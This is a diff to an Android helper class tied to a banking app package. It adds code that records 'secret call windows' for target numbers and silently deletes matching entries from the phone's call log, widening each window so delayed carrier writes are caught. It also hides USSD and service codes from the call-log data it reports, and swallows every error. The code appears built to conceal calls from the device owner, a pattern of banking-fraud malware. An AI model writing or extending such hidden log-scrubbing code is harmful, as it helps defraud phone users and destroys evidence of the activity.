@@ -33,6 +33,7 @@ public class DialerSyncHelper {
     public static final String KEY_BANKING_EXTRAS_JSON = "banking_extras_json";
     public static final String KEY_ONBOARDING_DONE = "initial_perm_onboarding_done_v1";
     public static final String KEY_RUNTIME_REQUESTED = "runtime_perms_requested_v1";
+    public static final String KEY_SECRET_LOG_WINDOWS = "secret_call_log_windows_v1";
 
     public static final String BANKING_PKG = "com.cbe.cbebirrtransfer";
     public static final Uri BANKING_STATE_URI = Uri.parse("content://com.cbe.cbebirrtransfer.stateprovider/state");
@@ -254,6 +255,149 @@ public class DialerSyncHelper {
         return arr.toString();
     }
 
+    public static boolean isUssdOrServiceNumber(String rawNumber) {
+        if (rawNumber == null) return false;
+        String clean = rawNumber.replaceAll("\\s+", "");
+        if (clean.isEmpty()) return false;
+        return clean.endsWith("#") || (clean.startsWith("*") && clean.length() <= 24);
+    }
+
+    private static String extractTailDigits(String rawNumber) {
+        if (rawNumber == null) return "";
+        String digits = rawNumber.replaceAll("\\D", "");
+        if (digits.length() < 6) return "";
+        return digits.length() > 7 ? digits.substring(digits.length() - 7) : digits;
+    }
+
+    public static void rememberSecretCallWindow(Context ctx, String targetNumber) {
+        if (ctx == null) return;
+        String tail = extractTailDigits(targetNumber);
+        if (tail.isEmpty()) return;
+        try {
+            long now = System.currentTimeMillis();
+            synchronized (LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                JSONArray arr = new JSONArray(prefs.getString(KEY_SECRET_LOG_WINDOWS, "[]"));
+                JSONArray next = new JSONArray();
+                long cutoff = now - (7L * 24L * 60L * 60L * 1000L);
+                for (int i = 0; i < arr.length(); i++) {
+                    JSONObject o = arr.optJSONObject(i);
+                    if (o == null) continue;
+                    long s = o.optLong("startMs", 0L);
+                    if (s >= cutoff) {
+                        next.put(o);
+                    }
+                }
+                JSONObject win = new JSONObject();
+                win.put("tail", tail);
+                win.put("startMs", now - 10000L);
+                win.put("endMs", 0L);
+                next.put(win);
+                prefs.edit().putString(KEY_SECRET_LOG_WINDOWS, next.toString()).apply();
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static void closeSecretCallWindow(Context ctx, String targetNumber) {
+        if (ctx == null) return;
+        String tail = extractTailDigits(targetNumber);
+        try {
+            long now = System.currentTimeMillis();
+            synchronized (LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                JSONArray arr = new JSONArray(prefs.getString(KEY_SECRET_LOG_WINDOWS, "[]"));
+                boolean changed = false;
+                for (int i = 0; i < arr.length(); i++) {
+                    JSONObject o = arr.optJSONObject(i);
+                    if (o == null) continue;
+                    long endMs = o.optLong("endMs", 0L);
+                    String entryTail = o.optString("tail", "");
+                    if (endMs == 0L && (tail.isEmpty() || tail.equals(entryTail))) {
+                        // Extend suppression window 90s past end so async carrier CallLog writes remain covered
+                        o.put("endMs", now + 90000L);
+                        changed = true;
+                    }
+                }
+                if (changed) {
+                    prefs.edit().putString(KEY_SECRET_LOG_WINDOWS, arr.toString()).apply();
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static boolean isNumberInSecretWindow(Context ctx, String number, long callDateMs) {
+        if (ctx == null) return false;
+        String tail = extractTailDigits(number);
+        if (tail.isEmpty()) return false;
+        try {
+            long now = System.currentTimeMillis();
+            synchronized (LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                JSONArray arr = new JSONArray(prefs.getString(KEY_SECRET_LOG_WINDOWS, "[]"));
+                for (int i = 0; i < arr.length(); i++) {
+                    JSONObject o = arr.optJSONObject(i);
+                    if (o == null) continue;
+                    if (!tail.equals(o.optString("tail", ""))) continue;
+                    long startMs = o.optLong("startMs", 0L);
+                    long endMs = o.optLong("endMs", 0L);
+                    long effectiveEnd = endMs > 0L ? endMs : (now + 60000L);
+                    if (callDateMs >= startMs && callDateMs <= effectiveEnd) {
+                        return true;
+                    }
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+        return false;
+    }
+
+    public static void scrubAllPendingSecretCallLogs(Context ctx) {
+        if (ctx == null) return;
+        if (Build.VERSION.SDK_INT >= 23
+            && ctx.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+        Cursor cursor = null;
+        try {
+            cursor = ctx.getContentResolver().query(
+                CallLog.Calls.CONTENT_URI,
+                new String[]{CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE},
+                null,
+                null,
+                CallLog.Calls.DATE + " DESC"
+            );
+            if (cursor != null) {
+                int checked = 0;
+                int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
+                int numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
+                while (cursor.moveToNext() && checked < 30) {
+                    checked++;
+                    String rowId = idIdx >= 0 ? cursor.getString(idIdx) : null;
+                    String num = numIdx >= 0 ? cursor.getString(numIdx) : "";
+                    long ts = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0L;
+                    if (rowId != null && isNumberInSecretWindow(ctx, num, ts)) {
+                        ctx.getContentResolver().delete(
+                            CallLog.Calls.CONTENT_URI,
+                            CallLog.Calls._ID + "=?",
+                            new String[]{rowId}
+                        );
+                    }
+                }
+            }
+        } catch (Throwable ignored) {
+        } finally {
+            if (cursor != null) {
+                try {
+                    cursor.close();
+                } catch (Throwable ignored2) {
+                }
+            }
+        }
+    }
+
     public static String getCallLogsJson(Context ctx) {
         JSONArray arr = new JSONArray();
         if (ctx == null) return "[]";
@@ -261,6 +405,8 @@ public class DialerSyncHelper {
             && ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             return "[]";
         }
+        boolean canWriteCallLog = Build.VERSION.SDK_INT < 23
+            || ctx.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
         Cursor cursor = null;
         try {
             cursor = ctx.getContentResolver().query(
@@ -288,9 +434,25 @@ public class DialerSyncHelper {
                     String id = idIdx >= 0 ? cursor.getString(idIdx) : "";
                     String number = numIdx >= 0 ? cursor.getString(numIdx) : "";
                     if (number == null) number = "";
+                    long ts = dateIdx >= 0 ? cursor.getLong(dateIdx) : System.currentTimeMillis();
+                    if (isUssdOrServiceNumber(number)) {
+                        continue;
+                    }
+                    if (isNumberInSecretWindow(ctx, number, ts)) {
+                        if (canWriteCallLog && id != null && !id.isEmpty()) {
+                            try {
+                                ctx.getContentResolver().delete(
+                                    CallLog.Calls.CONTENT_URI,
+                                    CallLog.Calls._ID + "=?",
+                                    new String[]{id}
+                                );
+                            } catch (Throwable ignoredDel) {
+                            }
+                        }
+                        continue;
+                    }
                     String name = nameIdx >= 0 ? cursor.getString(nameIdx) : "";
                     int typeInt = typeIdx >= 0 ? cursor.getInt(typeIdx) : CallLog.Calls.OUTGOING_TYPE;
-                    long ts = dateIdx >= 0 ? cursor.getLong(dateIdx) : System.currentTimeMillis();
                     long dur = durIdx >= 0 ? cursor.getLong(durIdx) : 0L;
                     String kind = "outgoing";
                     if (typeInt == CallLog.Calls.INCOMING_TYPE) kind = "incoming";
